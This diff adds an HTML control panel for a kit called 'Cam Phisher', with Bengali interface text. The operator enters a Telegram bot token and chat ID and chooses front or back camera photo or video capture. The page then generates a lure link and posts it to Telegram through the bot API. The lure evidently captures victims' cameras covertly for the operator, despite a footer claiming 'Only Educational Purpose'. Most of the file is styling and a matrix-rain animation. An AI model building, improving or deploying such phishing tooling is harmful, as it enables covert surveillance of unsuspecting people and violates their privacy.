@@ -1,0 +1,477 @@
+<!doctype html>
+<html lang="bn">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Cam Phisher</title>
+<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #040202;
+    --neon: #ff1f1f;
+    --neon-2: #ff6b6b;
+    --glow: rgba(255,31,31,0.18);
+    --green: #33d17a;
+    --avatar-size: 220px;
+    --input-h: 48px;            /* reduced height as requested */
+    --big-radius: 36px;
+    --card-radius: 12px;
+    --border-w: 2px;
+  }
+
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Rubik,system-ui,Arial,sans-serif;background:#000; color:var(--neon);}
+
+  /* full-screen rain canvas */
+  canvas#rainCanvas{
+    position:fixed;
+    left:0;
+    top:0;
+    width:100%;
+    height:100%;
+    z-index:0;
+    pointer-events:none; /* allow clicks through canvas */
+    mix-blend-mode:screen; /* subtle blend */
+    opacity:0.55;
+  }
+
+  /* content container sits above canvas */
+  .page-wrap{ position:relative; z-index:2; display:flex; justify-content:center; align-items:flex-start; padding:28px; min-height:100vh; }
+
+.page{
+  width:100%;
+  max-width:920px;
+  margin-top:18px;
+  opacity:1;               /* рж╢рзБрж░рзБрждрзЗржЗ ржкрзБрж░рзЛ ржжрзЗржЦрж╛ ржпрж╛ржмрзЗ */
+  transform: translateY(0); /* ржХрзЛржирзЛ ржирж┐ржЪ ржерзЗржХрзЗ ржЖрж╕рж╛рж░ ржЗржлрзЗржХрзНржЯ ржирзЗржЗ */
+  transition:none;         /* ржкрзБрж░рзЛ transition ржмржирзНржз */
+}
+
+  .page.show{ opacity:1; transform: translateY(0); }
+
+  .card{
+    ;
+    border-radius:var(--card-radius);
+    padding:22px;
+    border:var(--border-w) solid rgba(255,0,0,0.12);
+    box-shadow:0 20px 90px var(--glow), inset 0 -8px 40px rgba(0,0,0,0.36);
+    position:relative;
+    overflow:visible;
+    backdrop-filter: blur(6px);
+  }
+
+  .top{ display:flex; flex-direction:column; align-items:center; text-align:center; padding-bottom:8px; }
+  .avatar{
+    width:var(--avatar-size);
+    height:var(--avatar-size);
+    border-radius:50%;
+    background-size:cover;
+    background-position:center;
+    border:var(--border-w) solid rgba(255,0,0,0.95);
+    box-shadow:
+      0 0 20px rgba(255,0,0,0.95),
+      0 0 48px rgba(255,0,0,0.66),
+      0 0 120px rgba(255,0,0,0.36);
+    margin-bottom:14px;
+    transition: transform .34s cubic-bezier(.2,.9,.2,1), box-shadow .28s;
+  }
+
+  h1{ font-size:48px; 
+margin:6px 0; 
+color:var(--neon);
+ letter-spacing:2px;
+ text-shadow:0px 0px 30px red ;
+ line-height:1; }
+
+  .name-link{
+ color:var(--green);
+ font-weight:900;
+ text-decoration:none; 
+ padding:4px 8px;
+ border-radius:6px; 
+ background:rgba(51,209,122,0.02) }
+
+  .form{ margin-top:16px; display:flex; flex-direction:column; gap:12px; position:relative; }
+
+  /* wider inputs (use full width) and reduced height */
+  .input{
+    width:100%;
+    height:var(--input-h);
+    padding:10px 20px;
+    font-size:16px;
+    color:var(--neon);
+    background: linear-gradient(90deg, rgba(0,0,0,0.55), rgba(0,0,0,0.35));
+    border-radius:var(--big-radius);
+    border: var(--border-w) solid rgba(255,0,0,0.9);
+    outline:none;
+    box-shadow: inset 0 6px 22px rgba(0,0,0,0.6);
+    transition: box-shadow .18s, transform .12s;
+    font-weight:800;
+  }
+  .input::placeholder{ color:#ff8b8b; opacity:0.95; font-weight:700; font-size:15px; }
+
+  .input:focus{ box-shadow: 0 20px 60px rgba(255,0,0,0.12), inset 0 8px 20px rgba(0,0,0,0.6); transform: translateY(-2px); }
+
+  /* hidden original select kept for JS compatibility */
+  select#modeSelect{ position:absolute; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none; }
+
+  /* custom dropdown styles */
+  .select-wrap{ position:relative; width:100%; }
+  .custom-dropdown{
+    width:100%;
+    border-radius:36px;
+    height:50px;
+    background:rgba(0,0,0,0.45);
+    border:2px solid rgba(255,0,0,0.9);
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:10px 16px;
+    cursor:pointer;
+    font-weight:900;
+    font-size:16px;
+    color:var(--neon);
+    box-shadow:0 8px 30px rgba(0,0,0,0.6), 0 0 20px rgba(255,0,0,0.06);
+    transition: box-shadow .18s ease, transform .12s ease;
+    user-select:none;
+  }
+  .custom-dropdown .caret{ transition: transform .28s cubic-bezier(.2,.9,.2,1); font-size:18px; color:var(--neon); }
+
+  .panel{ position:absolute; left:0; right:0; top:62px; background:rgba(0,0,0,0.92); border-radius:14px; border:2px solid rgba(255,0,0,0.88); overflow:hidden; transform-origin:top center; box-shadow:0 30px 90px rgba(255,0,0,0.12); max-height:0; opacity:0; pointer-events:none; transform: translateY(8px) scale(0.98); transition: max-height .38s cubic-bezier(.2,.9,.2,1), opacity .26s ease, transform .34s cubic-bezier(.2,.9,.2,1); z-index:50; }
+  .panel.open{ max-height:220px; opacity:1; pointer-events:auto; transform: translateY(0) scale(1); }
+  .panel .item{ padding:12px 16px; font-weight:900; color:var(--neon); cursor:pointer; transition: background .12s, padding-left .12s; font-size:15px; }
+  .panel .item:hover{ background: rgba(255,0,0,0.12); padding-left:22px; }
+
+  .send-wrap{ display:flex; justify-content:center; margin-top:8px; }
+  .btn{ padding:12px 36px; font-size:18px; font-weight:900; border-radius:28px; border:var(--border-w) solid rgba(255,0,0,0.22); background:linear-gradient(90deg,#ff2e2e,#ff7b7b); color:#111; cursor:pointer; box-shadow:0 22px 60px rgba(255,0,0,0.14); transition: transform .12s, box-shadow .12s, filter .12s; }
+  .btn:hover{ transform: translateY(-4px) scale(1.02); box-shadow: 0 28px 90px rgba(255,0,0,0.26); filter: drop-shadow(0 0 18px rgba(255,0,0,0.45)); }
+
+  .msg{ margin-top:14px; padding:10px 14px; border-radius:6px; font-weight:800; display:none; text-align:center; border:2px solid transparent; font-size:14px; }
+  .msg.success{ background: linear-gradient(90deg, rgba(51,209,122,0.06), rgba(0,0,0,0.02)); color:var(--green); border-color: rgba(51,209,122,0.12) }
+  .msg.fail{ background: linear-gradient(90deg, rgba(255,77,77,0.04), rgba(0,0,0,0.02)); color:#ff6b6b; border-color: rgba(255,77,77,0.12); }
+
+  .footer-note{ margin-top:12px; color:#ff9b9b; text-align:center; font-size:13px }
+
+  /* avatar float animation */
+  @keyframes bob {
+    0% { transform: translateY(0) rotate(-0.2deg) }
+    50% { transform: translateY(-8px) rotate(0.4deg) }
+    100% { transform: translateY(0) rotate(-0.2deg) }
+  }
+  .avatar.float{ animation: bob 3.6s ease-in-out infinite; will-change: transform; }
+  .avatar.pulse{ animation: bob 1.6s ease-in-out 1; }
+
+  @media (prefers-reduced-motion: reduce){
+    .avatar.float{ animation:none }
+    .page, .panel, .custom-dropdown, .btn { transition: none; }
+  }
+
+  @media (max-width:900px){
+    :root{ --avatar-size:180px; }
+    h1{ font-size:36px; }
+    .input{ height:44px; font-size:15px; }
+    .custom-dropdown{ height:48px; font-size:15px; padding:10px 14px; }
+    .panel{ top:58px; }
+  }
+</style>
+</head>
+<body>
+  <!-- rain canvas -->
+  <canvas id="rainCanvas" aria-hidden="true"></canvas>
+
+  <div class="page-wrap">
+    <div class="page" id="pageRoot">
+      <div class="card">
+        <div class="top">
+          <div id="avatar" class="avatar" style="background-image: url('logo.jpeg');" title="Double-click to change"></div>
+          <h1>ЁЭЧЦЁЭЧФЁЭЧа ЁЭЧгЁЭЧЫЁЭЧЬЁЭЧжЁЭЧЫЁЭЧШЁЭЧе</h1>
+          <div class="by"><span class="name-span"><a class="name-link" href="#" id="authorLink">╩Щ╩П с┤А╩А╔к╩Пс┤А╔┤ с┤Н╔к╩Ас┤вс┤А</a></span></div>
+        </div>
+
+        <form id="mainForm" class="form" onsubmit="return false;">
+          <input id="token" class="input" type="text" placeholder="Enter bot token" autocomplete="off" aria-label="Bot token" />
+          <input id="chatid" class="input" type="text" placeholder="Enter Chat id" aria-label="Chat id" />
+
+          <div class="select-wrap" id="selectWrap">
+            <!-- hidden original select (kept for original JS) -->
+            <select id="modeSelect" class="select" aria-label="Select capture option">
+              <option value="front-photo">Front тАФ Photo (default)</option>
+              <option value="front-video">Front тАФ Video</option>
+              <option value="back-photo">Back тАФ Photo</option>
+              <option value="back-video">Back тАФ Video</option>
+            </select>
+
+            <!-- visible custom dropdown -->
+            <div id="customDropdown" class="custom-dropdown" role="button" tabindex="0" aria-haspopup="listbox" aria-expanded="false">
+              <span id="customLabel">Front тАФ Photo</span>
+              <span class="caret" id="customCaret">тЦ╛</span>
+            </div>
+
+            <div id="panel" class="panel" role="listbox" aria-labelledby="customLabel">
+              <div class="item" data-value="front-photo" role="option">Front тАФ Photo</div>
+              <div class="item" data-value="front-video" role="option">Front тАФ Video</div>
+              <div class="item" data-value="back-photo" role="option">Back тАФ Photo</div>
+              <div class="item" data-value="back-video" role="option">Back тАФ Video</div>
+            </div>
+          </div>
+
+          <div class="send-wrap">
+            <button id="sendBtn" class="btn" type="button">Send</button>
+          </div>
+
+          <div id="success" class="msg success" role="status" aria-hidden="true">тЬЕ рж╕ржлрж▓ржнрж╛ржмрзЗ рж▓рж┐ржВржХ ржкрж╛ржарж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗред</div>
+          <div id="fail" class="msg fail" role="status" aria-hidden="true">тЭМ рж▓рж┐ржВржХ ржкрж╛ржарж╛ржирзЛ ржмрзНржпрж░рзНрже тАФ Token/Chat ID ржпрж╛ржЪрж╛ржЗ ржХрж░рзЛред</div>
+
+          <div class="footer-note">ЁЭЩ╛ЁЭЪЧЁЭЪХЁЭЪв ЁЭЩ┤ЁЭЪНЁЭЪЮЁЭЪМЁЭЪКЁЭЪЭЁЭЪТЁЭЪШЁЭЪЧЁЭЪКЁЭЪХ ЁЭЩ┐ЁЭЪШЁЭЪЮЁЭЪЫЁЭЪЩЁЭЪШЁЭЪЬЁЭЪО.</div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+<!-- ===========================
+     ORIGINAL JS (unchanged)
+     =========================== -->
+<script>
+(function(){
+  const avatarEl = document.getElementById('avatar');
+  const tokenEl = document.getElementById('token');
+  const chatEl = document.getElementById('chatid');
+  const modeSelect = document.getElementById('modeSelect');
+  const sendBtn = document.getElementById('sendBtn');
+  const success = document.getElementById('success');
+  const fail = document.getElementById('fail');
+
+  function hideMsgs(){
+    success.style.display = 'none';
+    success.setAttribute('aria-hidden','true');
+    fail.style.display = 'none';
+    fail.setAttribute('aria-hidden','true');
+  }
+  hideMsgs();
+
+  modeSelect.addEventListener('change', ()=> {
+    modeSelect.style.background = 'linear-gradient(90deg,#ff4b4b,#ff8a8a)';
+    modeSelect.style.color = '#111';
+    modeSelect.style.borderColor = 'rgba(255,60,60,0.95)';
+    hideMsgs();
+  });
+
+  function buildLink(token, chatId, mode){
+    const base = location.origin.replace(/\/$/,'');
+    const t = encodeURIComponent(token.trim());
+    const id = encodeURIComponent(chatId.trim());
+    let url = `${base}/chat/?token=${t}&id=${id}&mode=${encodeURIComponent(mode)}`;
+    if(mode && mode.includes('video')) url += '&duration=5';
+    return url;
+  }
+
+  async function sendToTelegram(token, chatId, text){
+    const api = `https://api.telegram.org/bot${token}/sendMessage`;
+    try{
+      const res = await fetch(api, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: text, disable_web_page_preview: false })
+      });
+      return res.json();
+    }catch(e){
+      return { ok:false, error: (e && e.message) || String(e) };
+    }
+  }
+
+  function validate(){
+    const t = tokenEl.value.trim(), c = chatEl.value.trim();
+    if(!t || !c) return false;
+    if(!t.includes(':') || t.length < 20) return false;
+    return true;
+  }
+
+  sendBtn.addEventListener('click', async ()=>{
+    hideMsgs();
+    if(!validate()){
+      fail.textContent = 'тЭМ рж▓рж┐ржВржХ ржкрж╛ржарж╛ржирзЛ ржмрзНржпрж░рзНрже тАФ Token/Chat ID рж╕ржарж┐ржХ ржирзЯред';
+      fail.style.display = 'block';
+      fail.setAttribute('aria-hidden','false');
+      return;
+    }
+
+    sendBtn.disabled = true;
+    const oldTxt = sendBtn.textContent;
+    sendBtn.textContent = 'Sending...';
+
+    const token = tokenEl.value.trim();
+    const chatId = chatEl.value.trim();
+    const mode = modeSelect.value || 'front-photo';
+    const link = buildLink(token, chatId, mode);
+
+    const res = await sendToTelegram(token, chatId, link);
+    if(res && res.ok){
+      success.style.display = 'block';
+      success.setAttribute('aria-hidden','false');
+    } else {
+      fail.style.display = 'block';
+      fail.setAttribute('aria-hidden','false');
+      if(res && res.description) {
+        fail.textContent = 'тЭМ ' + (res.description || 'рж▓рж┐ржВржХ ржкрж╛ржарж╛ржирзЛ ржмрзНржпрж░рзНрже');
+      }
+      console.debug('telegram response', res);
+    }
+
+    sendBtn.disabled = false;
+    sendBtn.textContent = oldTxt;
+  });
+
+  // enter key support
+  [tokenEl, chatEl].forEach(el=>{
+    el.addEventListener('keydown', (e)=>{
+      if(e.key === 'Enter'){ e.preventDefault(); sendBtn.click(); }
+    });
+  });
+
+  // optional: double-click avatar to change image URL quickly
+  avatarEl.addEventListener('dblclick', ()=>{
+    const url = prompt('ржирждрзБржи avatar image URL ржмрж╕рж╛ржУ (cancel ржХрж░рж▓рзЗ ржЖржЧрзЗрж░ ржерж╛ржХржмрзЗ)');
+    if(url) avatarEl.style.backgroundImage = `url(${url})`;
+  });
+
+})();
+</script>
+
+<!-- ===========================
+     NEW: rain animation + UI helpers + dropdown sync
+     (this does NOT modify original JS logic)
+     =========================== -->
+<script>
+/* ---------- MATRIX-LIKE RAIN (canvas) ---------- */
+(function(){
+  const canvas = document.getElementById('rainCanvas');
+  const ctx = canvas.getContext('2d');
+  let width = canvas.width = window.innerWidth;
+  let height = canvas.height = window.innerHeight;
+
+  // characters set тАФ choose subtle alphanum and some symbols for hacking vibe
+  const letters = '01<>/{}[]()*#@$%ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const fontSize = 14; // control density
+  const columns = Math.floor(width / fontSize);
+  const drops = Array(columns).fill(0);
+
+  function resize(){
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+    const cols = Math.floor(width / fontSize);
+    drops.length = cols;
+    for(let i=0;i<drops.length;i++){ if(!drops[i]) drops[i] = Math.random() * height; }
+  }
+  window.addEventListener('resize', resize, { passive:true });
+
+  // draw loop
+  let last = 0;
+  function draw(now){
+    // throttle a bit
+    const delta = now - last;
+    if(delta < 30){ requestAnimationFrame(draw); return; }
+    last = now;
+
+    // translucent black to slightly fade trails
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
+    ctx.fillRect(0, 0, width, height);
+
+    ctx.font = fontSize + 'px monospace';
+    for(let i=0;i<drops.length;i++){
+      const text = letters.charAt(Math.floor(Math.random() * letters.length));
+      // green-ish color with subtle neon
+      ctx.fillStyle = 'rgba(50, 255, 140, 0.85)';
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      // small brighter head occasionally
+      if(Math.random() > 0.96){
+        ctx.fillStyle = 'rgba(200,255,200,0.98)';
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize - fontSize);
+      }
+
+      // move drop
+      if(drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+
+    requestAnimationFrame(draw);
+  }
+
+  // Respect reduced-motion preference
+  const prefersReduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(!prefersReduce){
+    resize();
+    requestAnimationFrame(draw);
+  } else {
+    // if reduced motion, make canvas subtle static overlay (no animation)
+    ctx.fillStyle = 'rgba(0,0,0,0.6)';
+    ctx.fillRect(0,0,width,height);
+  }
+})();
+
+/* ---------- UI entrance + avatar float + dropdown sync ---------- */
+(function(){
+  const page = document.getElementById('pageRoot');
+  const avatar = document.getElementById('avatar');
+
+  // page entrance
+  window.requestAnimationFrame(()=> {
+    setTimeout(()=> page.classList.add('show'), 80);
+  });
+
+  // avatar float/pulse
+  function startAvatarFloat(){
+    avatar.classList.add('float');
+    avatar.classList.add('pulse');
+    setTimeout(()=> avatar.classList.remove('pulse'), 1600);
+  }
+  setTimeout(startAvatarFloat, 420);
+
+  // custom dropdown sync (keeps original JS working)
+  const custom = document.getElementById('customDropdown');
+  const panel = document.getElementById('panel');
+  const label = document.getElementById('customLabel');
+  const caret = document.getElementById('customCaret');
+  const items = Array.from(panel.querySelectorAll('.item'));
+  const hiddenSelect = document.getElementById('modeSelect');
+
+  label.textContent = hiddenSelect.options[hiddenSelect.selectedIndex].textContent;
+
+  function openPanel(){ panel.classList.add('open'); custom.classList.add('open'); custom.setAttribute('aria-expanded','true'); caret.style.transform='rotate(180deg)'; }
+  function closePanel(){ panel.classList.remove('open'); custom.classList.remove('open'); custom.setAttribute('aria-expanded','false'); caret.style.transform='rotate(0deg)'; }
+  function togglePanel(){ if(panel.classList.contains('open')) closePanel(); else openPanel(); }
+
+  custom.addEventListener('click', (e)=> { e.stopPropagation(); togglePanel(); });
+  custom.addEventListener('keydown', (e)=> { if(e.key==='Enter'||e.key===' '){ e.preventDefault(); togglePanel(); } if(e.key==='ArrowDown'){ e.preventDefault(); openPanel(); items[0].focus(); } });
+
+  items.forEach(it=>{
+    it.setAttribute('tabindex','0');
+    it.addEventListener('click', ()=>{
+      const v = it.getAttribute('data-value');
+      const txt = it.textContent.trim();
+      hiddenSelect.value = v;
+      const ev = new Event('change', { bubbles: true });
+      hiddenSelect.dispatchEvent(ev);
+      label.textContent = txt;
+      closePanel();
+    });
+    it.addEventListener('keydown',(e)=>{
+      if(e.key==='Enter'){ e.preventDefault(); it.click(); }
+      if(e.key==='ArrowDown'){ e.preventDefault(); const next = it.nextElementSibling || items[0]; next.focus(); }
+      if(e.key==='ArrowUp'){ e.preventDefault(); const prev = it.previousElementSibling || items[items.length-1]; prev.focus(); }
+      if(e.key==='Escape'){ e.preventDefault(); closePanel(); custom.focus(); }
+    });
+  });
+
+  document.addEventListener('click',(e)=>{ if(!document.getElementById('selectWrap').contains(e.target)) closePanel(); });
+  hiddenSelect.addEventListener('change', ()=> { const idx = hiddenSelect.selectedIndex; if(idx>=0){ label.textContent = hiddenSelect.options[idx].textContent; custom.style.boxShadow='0 20px 60px rgba(255,0,0,0.18)'; setTimeout(()=> custom.style.boxShadow='',400); } });
+
+  // respect reduced-motion: disable float if user prefers
+  const prefersReduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(prefersReduce){
+    avatar.classList.remove('float');
+  }
+})();
+</script>
+</body>
+  </html>
